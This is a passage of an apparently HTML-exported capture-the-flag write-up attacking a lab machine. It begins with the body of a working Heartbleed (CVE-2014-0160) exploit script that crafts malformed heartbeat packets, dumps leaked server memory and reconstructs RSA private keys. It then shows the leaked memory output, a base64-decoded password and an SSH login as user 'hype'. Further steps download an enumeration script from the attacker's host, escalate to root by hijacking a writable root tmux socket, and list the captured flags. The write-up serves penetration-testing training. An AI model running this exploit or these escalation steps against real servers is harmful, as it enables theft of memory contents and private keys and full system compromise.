encoder<br/>    from pyasn1.type.univ import *<br/><br/>def hex2bin(arr):<br/>    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')<br/><br/>tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}<br/><br/>def build_client_hello(tls_ver):<br/>    client_hello = [<br/># TLS header ( 5 bytes)<br/>0x16,               # Content type (0x16 for handshake)<br/>0x03, tls_ver,         # TLS Version<br/>0x00, 0xdc,         # Length<br/># Handshake header<br/>0x01,               # Type (0x01 for ClientHello)<br/>0x00, 0x00, 0xd8,   # Length<br/>0x03, tls_ver,         # TLS Version<br/># Random (32 byte)<br/>0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,<br/>0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,<br/>0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,<br/>0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,<br/>0x00,               # Session ID length<br/>0x00, 0x66,         # Cipher suites length<br/># Cipher suites (51 suites)<br/>0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,<br/>0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,<br/>0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,<br/>0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,<br/>0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,<br/>0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,<br/>0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,<br/>0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,<br/>0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,<br/>0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,<br/>0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,<br/>0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,<br/>0x00, 0x06, 0x00, 0x03, 0x00, 0xff,<br/>0x01,               # Compression methods length<br/>0x00,               # Compression method (0x00 for NULL)<br/>0x00, 0x49,         # Extensions length<br/># Extension: ec_point_formats<br/>0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,<br/># Extension: elliptic_curves<br/>0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,<br/>0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,<br/>0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,<br/>0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,<br/>0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,<br/>0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,<br/>0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,<br/># Extension: SessionTicket TLS<br/>0x00, 0x23, 0x00, 0x00,<br/># Extension: Heartbeat<br/>0x00, 0x0f, 0x00, 0x01, 0x01<br/>    ]<br/>    return client_hello<br/> <br/>def build_heartbeat(tls_ver):<br/>    heartbeat = [<br/>0x18,       # Content Type (Heartbeat)<br/>0x03, tls_ver,  # TLS version<br/>0x00, 0x03,  # Length<br/># Payload<br/>0x01,       # Type (Request)<br/>0x40, 0x00  # Payload length<br/>    ] <br/>    return heartbeat<br/><br/><br/>if opts.rawoutfile:<br/>    rawfileOUT = open(opts.rawoutfile, "a")<br/><br/>if opts.asciioutfile:<br/>    asciifileOUT = open(opts.asciioutfile, "a")<br/> <br/>if opts.extractkey:<br/>    opts.donotdisplay = True<br/> <br/>def hexdump(s):<br/>    pdat = ''<br/>    hexd = ''<br/>    for b in xrange(0, len(s), 16):<br/>        lin = [c for c in s[b : b + 16]]<br/>        if opts.hexdump:<br/>            hxdat = ' '.join('%02X' % ord(c) for c in lin)<br/>            pdat = ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin)<br/>            hexd += '  %04x: %-48s %s\n' % (b, hxdat, pdat)<br/>        else:<br/>            pdat += ''.join((c if ((32 &lt;= ord(c) &lt;= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)<br/>    if opts.hexdump:<br/>	    return hexd<br/>    else:<br/>        pdat = re.sub(r'([.]{50,})', '', pdat)<br/>        if opts.asciioutfile:<br/>            asciifileOUT.write(pdat)<br/>        return pdat<br/><br/>def rcv_tls_record(s):<br/>    try:<br/>        tls_header = s.recv(5)<br/>        if not tls_header:<br/>            print 'Unexpected EOF (header)' <br/>            return None,None,None        <br/>        typ,ver,length = struct.unpack('&gt;BHH',tls_header)<br/>        message = ''<br/>        while len(message) != length:<br/>            message += s.recv(length-len(message))<br/>        if not message:<br/>            print 'Unexpected EOF (message)'<br/>            return None,None,None<br/>        if opts.verbose:<br/>	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)<br/>        return typ,ver,message<br/>    except Exception as e:<br/>        print "\nError Receiving Record! " + str(e)<br/>        return None,None,None<br/><br/>def hit_hb(s, targ, firstrun, supported):<br/>    s.send(hex2bin(build_heartbeat(supported)))<br/>    while True:<br/>        typ, ver, pay = rcv_tls_record(s)<br/>        if typ is None:<br/>            print 'No heartbeat response received, server likely not vulnerable'<br/>            return ''<br/><br/>        if typ == 24:<br/>            if opts.verbose:<br/>                print 'Received heartbeat response...'<br/>            if len(pay) &gt; 3:<br/>                if firstrun or opts.verbose:<br/>                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'<br/>                if opts.rawoutfile:<br/>                    rawfileOUT.write(pay)<br/>                if opts.extractkey:<br/>                	return pay<br/>                else:<br/>	                return hexdump(pay)<br/>            else:<br/>                print 'Server processed malformed heartbeat, but did not return any extra data.'<br/><br/>        if typ == 21:<br/>            print 'Received alert:'<br/>            return hexdump(pay)<br/>            print 'Server returned error, likely not vulnerable'<br/>            return ''<br/><br/><br/>def conn(targ, port):<br/>    try:<br/>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>        sys.stdout.flush()<br/>        s.settimeout(10)<br/>        #time.sleep(0.2)<br/>        s.connect((targ, port))<br/>        return s<br/><br/>    except Exception as e:<br/>       print "Connection Error! " + str(e)<br/>       return None<br/> <br/>def bleed(targ, port):<br/>    try:<br/>        res = ''<br/>        firstrun = True<br/>        print '\n##################################################################'<br/>        print 'Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times'<br/>        for x in range(0, opts.num):<br/>            if x &gt; 0:<br/>                firstrun = False<br/> <br/>            if x == 0 and opts.extractkey:<br/>                print "Attempting to extract private key from returned data..."<br/>                if not os.path.exists('./hb-certs'):<br/>                    os.makedirs('./hb-certs')<br/>                print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'<br/>                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 &gt; hb-certs/sslcert_' + targ + '.pem')	<br/>                print '\nExtracting modulus from cert...\n'<br/>                os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem &gt; hb-certs/sslcert_' + targ + '_pubkey.pem')<br/>                output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')<br/>                modulus = output.read()<br/> <br/>            s = conn(targ, port)<br/>            if not s:<br/>                continue<br/><br/>            # send starttls command if specified as an option or if common smtp/pop3/imap ports are used<br/>            if (opts.starttls) or (port in {25, 587, 110, 143, 21}):<br/> <br/>                stls = False<br/>                atls = False<br/> <br/>                # check if smtp supports starttls/stls<br/>                if port in {25, 587}:<br/>                    print 'SMTP Port... Checking for STARTTLS Capability...'<br/>                    check = s.recv(1024)<br/>                    s.send("EHLO someone.org\n")<br/>                    sys.stdout.flush()<br/>                    check += s.recv(1024)<br/>                    if opts.verbose:<br/>                        print check<br/> <br/>                    if "STARTTLS" in check:<br/>                        opts.starttls = True<br/>                        print "STARTTLS command found"<br/>                    elif "STLS" in check:<br/>                        opts.starttls = True<br/>                        stls = True<br/>                        print "STLS command found"<br/>                    else:<br/>                        print "STARTTLS command NOT found!"<br/>                        print '##################################################################'<br/>                        return<br/> <br/>                # check if pop3/imap supports starttls/stls                            <br/>                elif port in {110, 143}:<br/>                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'<br/>                    check = s.recv(1024)<br/>                    if port == 110:<br/>                        s.send("CAPA\n")<br/>                    if port == 143:<br/>                        s.send("CAPABILITY\n")<br/>                    sys.stdout.flush()<br/>                    check += s.recv(1024)<br/>                    if opts.verbose:<br/>                        print check<br/> <br/>                    if "STARTTLS" in check:<br/>                        opts.starttls = True<br/>                        print "STARTTLS command found"<br/>                    elif "STLS" in check:<br/>                        opts.starttls = True<br/>                        stls = True<br/>                        print "STLS command found"<br/>                    else:<br/>                        print "STARTTLS command NOT found!"<br/>                        print '##################################################################'<br/>                        return<br/> <br/>                # check if ftp supports auth tls/starttls                          <br/>                elif port in {21}:<br/>                    print 'FTP Port... Checking for AUTH TLS Capability...'<br/>                    check = s.recv(1024)<br/>                    s.send("FEAT\n")<br/>                    sys.stdout.flush()<br/>                    check += s.recv(1024)<br/>                    if opts.verbose:<br/>                        print check<br/> <br/>                    if "STARTTLS" in check:<br/>                        opts.starttls = True<br/>                        print "STARTTLS command found"<br/>                    elif "AUTH TLS" in check:<br/>                        opts.starttls = True<br/>                        atls = True<br/>                        print "AUTH TLS command found"<br/>                    else:<br/>                        print "STARTTLS command NOT found!"<br/>                        print '##################################################################'<br/>                        return<br/> <br/>                # send appropriate tls command if supported                        <br/>                if opts.starttls:       <br/>                    sys.stdout.flush()<br/>                    if stls:<br/>                        print 'Sending STLS Command...'<br/>                        s.send("STLS\n")<br/>                    elif atls:<br/>                        print 'Sending AUTH TLS Command...'<br/>                        s.send("AUTH TLS\n")<br/>                    else:<br/>                        print 'Sending STARTTLS Command...'<br/>                        s.send("STARTTLS\n")<br/>                    if opts.verbose:<br/>                        print 'Waiting for reply...'<br/>                    sys.stdout.flush()<br/>                    rcv_tls_record(s)<br/><br/>            supported = False<br/>            for num,tlsver in tls_versions.items():<br/> <br/>                if firstrun:<br/>                    print 'Sending Client Hello for {}'.format(tlsver)<br/>                s.send(hex2bin(build_client_hello(num)))<br/> <br/>                if opts.verbose:<br/>                    print 'Waiting for Server Hello...'<br/> <br/>                while True:<br/>                    typ,ver,message = rcv_tls_record(s)<br/>                    if not typ:<br/>                        if opts.verbose:<br/>                            print 'Server closed connection without sending ServerHello for {}'.format(tlsver)<br/>                        s.close()<br/>                        s = conn(targ, port)<br/>                        break<br/>                    if typ == 22 and ord(message[0]) == 0x0E:<br/>                        if firstrun:<br/>                            print 'Received Server Hello for {}'.format(tlsver)<br/>                        supported = True<br/>                        break<br/>                if supported: break<br/><br/>            if not supported:<br/>                print '\nError! No TLS versions supported!'<br/>                print '##################################################################'<br/>                return<br/><br/>            if opts.verbose:<br/>                print '\nSending heartbeat request...'<br/>            sys.stdout.flush()<br/> <br/>            keyfound = False<br/>            if opts.extractkey:<br/>            	res = hit_hb(s, targ, firstrun, supported)<br/>            	if res == '':<br/>            	    continue<br/>            	keyfound = extractkey(targ, res, modulus)<br/>            else:<br/>	            res += hit_hb(s, targ, firstrun, supported)<br/>            s.close()<br/>            if keyfound:<br/>                sys.exit(0)<br/>            else:<br/>                sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))<br/>                sys.stdout.flush()<br/> <br/>        print '\n##################################################################'<br/>        print       <br/>        return res<br/> <br/>    except Exception as e:<br/>       print "Error! " + str(e)<br/>       print '##################################################################'<br/>       print               <br/><br/>def extractkey(host, chunk, modulus):<br/> <br/>    #print "\nChecking for private key...\n"<br/>    n = int (modulus, 16)<br/>    keysize = n.bit_length() / 16<br/><br/>    for offset in xrange (0, len (chunk) - keysize):<br/>        p = long (''.join (["%02x" % ord (chunk[x]) for x in xrange (offset + keysize - 1, offset - 1, -1)]).strip(), 16)<br/>        if gmpy.is_prime (p) and p != n and n % p == 0:<br/>            if opts.verbose:<br/>                print '\n\nFound prime: ' + str(p)<br/>            e = 65537<br/>            q = n / p<br/>            phi = (p - 1) * (q - 1)<br/>            d = gmpy.invert (e, phi)<br/>            dp = d % (p - 1)<br/>            dq = d % (q - 1)<br/>            qinv = gmpy.invert (q, p)<br/>            seq = Sequence()<br/>            for x in [0, n, e, d, p, q, dp, dq, qinv]:<br/>                seq.setComponentByPosition (len (seq), Integer (x))<br/>            print "\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq))<br/>            privkeydump = open("hb-certs/privkey_" + host + ".dmp", "a")<br/>            privkeydump.write(chunk)<br/>            return True<br/>        else:<br/>            return False<br/><br/>def main():<br/><br/>    print "\ndefribulator v1.16"<br/>    print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"<br/>    allresults = ''<br/> <br/>    # if a file is specified, loop through file<br/>    if opts.filein:<br/>        fileIN = open(opts.filein, "r")<br/> <br/>        for line in fileIN:<br/>            targetinfo = line.strip().split(":")<br/>            if len(targetinfo) &gt; 1:<br/>                allresults = bleed(targetinfo[0], int(targetinfo[1]))<br/>            else:<br/>                allresults = bleed(targetinfo[0], opts.port)<br/> <br/>            if allresults and (not opts.donotdisplay):<br/>                print '%s' % (allresults)<br/><br/>        fileIN.close()<br/><br/>    else:<br/>        if len(args) &lt; 1:<br/>            options.print_help()<br/>            return<br/>        allresults = bleed(args[0], opts.port)<br/>        if allresults and (not opts.donotdisplay):<br/>            print '%s' % (allresults)<br/> <br/>    print<br/> <br/>    if opts.rawoutfile:<br/>        rawfileOUT.close()<br/> <br/>    if opts.asciioutfile:<br/>        asciifileOUT.close()<br/> <br/>if __name__ == '__main__':<br/>    main()<br/></div></div></div>
<div class="page" id="run heartbleeed"><h1><b><u>run heartbleeed</u></b></h1><span style="color:#ffa500;">heartbleed.py</span><span style="color:#24ff00;"> did not leak enough memory to output useful information, lets take a look at the usage and try to loop running heartbleed on the target:</span><br/><span style="color:#ffa500;">python heartbleed.py 10.10.10.79</span><br/><img alt="images/2041-1.png" src="images/2041-1.png"/></div>
<div class="page" id="usage "><h1><b><u>usage </u></b></h1><span style="color:#ffa500;">-n </span><span style="color:#24ff00;">is the parameter that loops heartbleed, lets run it back and see what we find!</span><br/><br/><img alt="images/2042-1.png" src="images/2042-1.png"/></div>
<div class="page" id="heartbleed.py  -n 20"><h1><b><u>heartbleed.py <target ip=""> -n 20</target></u></b></h1><img alt="images/2043-1.png" src="images/2043-1.png"/><br/><br/><span style="color:#ffa500;">python heartbleed.py 10.10.10.79 -n 20</span><br/><br/><div class="codebox"><div style="background-color: #001b33 ; padding: 10px; border: 1px solid green;">defribulator v1.16<br/>A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)<br/><br/>##################################################################<br/>Connecting to: 10.10.10.79:443, 20 times<br/>Sending Client Hello for TLSv1.0<br/>Received Server Hello for TLSv1.0<br/><br/>WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!<br/>Please wait... connection attempt 20 of 20<br/>##################################################################<br/><br/>.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.......0.0.1/decode.php<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 42<br/><br/>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.%...l1..l.[.f4.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>.*.(...............................#.......Y.... &lt;...,.L.O....:..........88...Ia.aG.S........<br/>...........................+........-.....3.&amp;.$... }..-...A.sd......c.@v...1.nb.oY$.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.......0.0.1/decode.php<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 42<br/><br/>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.%...l1..l.[.f4.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.......9<br/>X-AnyConnect-Platform: mac-intel<br/><br/>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;config-auth client="vpn" type="init" aggregate-auth-version="2"&gt;<br/>&lt;version who="vpn"&gt;3.1.05160&lt;/version&gt;<br/>&lt;device-id device-type="MacBookAir4,1" platform-version="10.9.2" unique-id="AD2E502557D3FFE604A662DAFFCC3B3D86CE6E3C50F5FEB0267885384F48B853E215151761C5F862EDA72D07D4F8C5CB8E09420A3D0356544FC7DCFB0E4D418C"&gt;mac-intel&lt;/device-id&gt;<br/>&lt;mac-address-list&gt;<br/>&lt;mac-address&gt;fe:cb:03:74:e1:fd&lt;/mac-address&gt;&lt;/mac-address-list&gt;<br/>&lt;group-select&gt;VPN&lt;/group-select&gt;<br/>&lt;group-access&gt;<a href="https://10.10.10.79:443&lt;/group-access&gt;">https://10.10.10.79:443&lt;/group-access&gt;</a><br/>.@....SC[...r....+..H...9...*..Mn.<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.......0.79<br/><br/>.*.(.......................$N..........<br/>8.#.Dt.0.E.d.+.,.y[X.......JgedObjectReference" type="ServiceInstance"&gt;ServiceInstance&lt;/_this&gt;&lt;/RetrieveServiceContent&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 15O...{..K.....w..'.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.......0.0.1/decode.php<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 42<br/><br/>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==KH.L..e..q.q.U..M.0.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>.*.(...............................#.......Y.... &lt;...,.L.O....:..........88...Ia.aG.S........<br/>...........................+........-.....3.&amp;.$... }..-...A.sd......c.@v...1.nb.oY$.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.......0.0.1/decode.php<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 42<br/><br/>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==KH.L..e..q.q.U..M.0.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>.*.(...............................#.......Y.... &lt;...,.L.O....:..........88...Ia.aG.S........<br/>...........................+........-.....3.&amp;.$... }..-...A.sd......c.@v...1.nb.oY$.@....SC[...r....+..H...9...<br/>....w.3....f...<br/>...!.9.8.........5...............<br/>.........3.2.....E.D...../...A.................................I.........<br/>...........<br/>...................................#<br/></div></div></div>
<div class="page" id="interesting finds"><h1><b><u>interesting finds</u></b></h1><span style="color:#24ff00;">found a couple of interesting memory leaks from the server:</span><br/><br/><span style="color:#ffff00;"><br/><div class="codebox"><div style="background-color: #001b33 ; padding: 10px; border: 1px solid green;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;config-auth client="vpn" type="init" aggregate-auth-version="2"&gt;<br/>&lt;version who="vpn"&gt;3.1.05160&lt;/version&gt;<br/>&lt;device-id device-type="MacBookAir4,1" platform-version="10.9.2" unique-id="AD2E502557D3FFE604A662DAFFCC3B3D86CE6E3C50F5FEB0267885384F48B853E215151761C5F862EDA72D07D4F8C5CB8E09420A3D0356544FC7DCFB0E4D418C"&gt;mac-intel&lt;/device-id&gt;<br/>&lt;mac-address-list&gt;<br/>&lt;mac-address&gt;fe:cb:03:74:e1:fd&lt;/mac-address&gt;&lt;/mac-address-list&gt;<br/>&lt;group-select&gt;VPN&lt;/group-select&gt;<br/>&lt;group-access&gt;https://10.10.10.79:443&lt;/group-access&gt;</div></div><br/></span><br/><br/><span style="color:#24ff00;">and some base 64 text:</span><br/><span style="color:#ffff00;">$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</span><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="base 64 text"><h1><b><u>base 64 text</u></b></h1><span style="color:#ffff00;">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</span><br/><br/><span style="color:#24ff00;">decode base 64 of this text gives us:</span><br/><span style="color:#ffa500;">echo ‘aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==’ | base64 -d </span><br/><br/><span style="color:#ffff00;">heartbleedbelievethehype</span><br/><img alt="images/2045-1.png" src="images/2045-1.png"/><br/><br/></div>
<div class="page" id="ssh -i hype_key hype@10.10.10.79"><h1><b><u>ssh -i hype_key hype@10.10.10.79</u></b></h1><span style="color:#24ff00;">given the </span><span style="color:#ffff00;">key</span><span style="color:#24ff00;">, base64 </span><span style="color:#ffff00;">password</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">heartbleedbelievethehype</span> and username <span style="color:#ffff00;">hype</span><span style="color:#24ff00;">, lets see if we can log in:</span><br/><br/><span style="color:#24ff00;">Oops, we have bad permissions on our hype_key file so we need to chmod to correct them real fast....</span><br/><span style="color:#ffa500;">chmod 600 </span><span style="color:#24ff00;">sets the correct permissions on an ssh key</span><br/><img alt="images/2046-1.png" src="images/2046-1.png"/><br/><br/><span style="color:#24ff00;">one more time....success! we have logged in as </span><span style="color:#ffff00;">hype</span><br/><img alt="images/2046-2.png" src="images/2046-2.png"/><br/><br/><br/></div>
<div class="page" id="priv esc"><h1><b><u>priv esc</u></b></h1><span style="color:#24ff00;">lets enumerate potentail privilege escalation vulnerabillites with</span><span style="color:#ffa500;"> lse.sh</span><br/><br/><span style="color:#24ff00;">first lets spin up an http server and download lse to our victim</span><br/><img alt="images/2049-1.png" src="images/2049-1.png"/><br/><br/><span style="color:#ffa500;">wget 10.10.14.62/lse.sh</span><br/><img alt="images/2049-2.png" src="images/2049-2.png"/><br/><br/></div>
<div class="page" id="linux smart enumeration"><h1><b><u>linux smart enumeration</u></b></h1>some interesting finds from lse.sh <br/><br/><span style="color:#24ff00;">1 theres a cron job that runs every minute <br/></span><span style="color:#ffa500;">-x /usr/lib/php5/maxlifetime ] &amp;&amp; [ -d /var/lib/php5 ] &amp;&amp; find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2&gt;/dev/null \; -delete</span><br/><img alt="images/2050-1.png" src="images/2050-1.png"/><br/><br/><span style="color:#24ff00;">2) there are also write to executable paths present in that </span><span style="color:#ffa500;">cron job </span><br/><img alt="images/2050-2.png" src="images/2050-2.png"/><br/><br/><span style="color:#24ff00;">3) there are a bunch of uncommon </span><span style="color:#ffa500;">SUID binaries</span> <span style="color:#24ff00;">that we might be able to take advantage of with </span><span style="color:#ffa500;">GTFO bins</span><br/><img alt="images/2050-3.png" src="images/2050-3.png"/><br/><br/><span style="color:#24ff00;">4)not normally as damning but we do have a bash_history file that hype owns we can take a look at as well</span><br/><img alt="images/2050-4.png" src="images/2050-4.png"/></div>
<div class="page" id="notes"><h1><b><u>notes</u></b></h1><span style="color:#24ff00;">Linux Kernel was from back in 2012 which means plenty of linux exploits probably work for privesc on this machine, mainly </span><span style="color:#ffa500;">DirtyCow</span><span style="color:#24ff00;">:</span><span style="text-decoration:underline;"><br/><br/></span><img alt="images/2052-1.png" src="images/2052-1.png"/><br/><br/><br/><span style="color:#24ff00;">We have a bash history that we can see what the user hype was up to:</span><br/><img alt="images/2052-2.png" src="images/2052-2.png"/><br/><br/><span style="color:#24ff00;">the tmux commands stand out since the </span><span style="color:#ffa500;">-S </span><span style="color:#24ff00;">flag means it is connecting to a tmux session potentially owned by root</span><br/><img alt="images/2052-3.png" src="images/2052-3.png"/></div>
<div class="page" id="ps -ef | grep root"><h1><b><u>ps -ef | grep root</u></b></h1><span style="color:#24ff00;">lets grep for all the root running processes on the box:</span><br/><img alt="images/2053-1.png" src="images/2053-1.png"/><br/><img alt="images/2053-2.png" src="images/2053-2.png"/><br/><br/><img alt="images/2053-3.png" src="images/2053-3.png"/></div>
<div class="page" id="log onto root tmux session"><h1><b><u>log onto root tmux session</u></b></h1><span style="color:#24ff00;">we see root is running </span><span style="color:#ffa500;">tmux</span><span style="color:#24ff00;">:</span><br/><img alt="images/2054-1.png" src="images/2054-1.png"/><br/><br/><span style="color:#24ff00;">lets check the permissions of </span><span style="color:#ffa500;">tmux</span><br/><img alt="images/2054-2.png" src="images/2054-2.png"/><br/><span style="color:#24ff00;">bingo! we have read and write permissions to a process that is owned by </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> and group-owned by </span><span style="color:#ffff00;">hype</span><span style="color:#24ff00;">.</span><br/><br/><span style="color:#24ff00;">Lets check our group real fast with </span><span style="color:#ffa500;">group</span><br/><img alt="images/2054-3.png" src="images/2054-3.png"/><br/><br/><span style="color:#24ff00;">and just like that, issuing </span><span style="color:#ffa500;">tmux -S /.devs/dev_sess</span><span style="color:#24ff00;"><br/>logs us into a session owned by </span><span style="color:#ffff00;">root</span><br/><br/><img alt="images/2054-4.png" src="images/2054-4.png"/><br/><br/><img alt="images/2054-5.png" src="images/2054-5.png"/><br/><img alt="images/2054-6.png" src="images/2054-6.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/2051-1.png" src="images/2051-1.png"/><br/><span style="color:#ffff00;">e6710a5464769fd5fcd216e076961750</span><br/><br/><img alt="images/2051-2.png" src="images/2051-2.png"/><br/><span style="color:#ffff00;">f1bb6d759df1f272914ebbc9ed7765b2</span></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/2048-1.png" src="images/2048-1.png"/></div>
</div></body></html>